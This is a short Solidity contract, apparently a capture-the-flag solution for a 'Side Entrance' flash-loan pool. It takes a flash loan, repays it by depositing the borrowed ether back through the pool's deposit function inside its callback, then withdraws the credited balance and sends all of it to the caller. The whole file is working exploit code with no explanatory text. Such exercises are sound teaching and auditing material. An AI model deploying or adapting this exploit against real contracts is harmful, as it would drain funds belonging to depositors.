// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract AttackerSideEntrance {

    fallback() external payable {}

    function attack(address _pool, uint256 amount) public {
        IPool(_pool).flashLoan(amount);
        IPool(_pool).withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        IPool(msg.sender).deposit{value: msg.value}();  
    }
}